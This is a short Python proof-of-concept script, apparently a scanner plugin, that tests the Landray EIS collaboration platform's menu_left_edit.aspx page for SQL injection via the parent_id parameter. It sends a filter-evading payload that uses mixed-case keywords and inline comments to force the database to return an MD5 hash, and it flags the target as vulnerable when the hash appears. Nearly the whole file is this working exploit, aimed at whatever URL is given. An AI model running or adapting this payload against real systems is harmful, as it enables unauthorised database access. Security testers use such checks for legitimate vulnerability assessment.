#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 蓝凌EIS智慧协同平台menu_left_edit.aspx SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0111278
author: Lucifer
description: 文件menu_left_edit.aspx中,参数parent_id存在SQL注入。
'''
import sys
import json
import requests
import warnings
  
  

class eis_menu_left_edit_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['蓝凌EIS智慧协同平台menu_left_edit.aspx SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {
            "action":"dragdrop",
            "id":"1",
            "parent_id":"1/**/WhErE/**/1=(SeLeCt/**/Sys.Fn_VarBinToHexStr(HashBytes('Md5','1234')))--"
        }
        payload = "/sm/menu_left_edit.aspx"
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1]=vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            else:
                result[2]=  '不存在'

        except:
            result[2]='未知'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = eis_menu_left_edit_sqli(sys.argv[1])
    testVuln.run()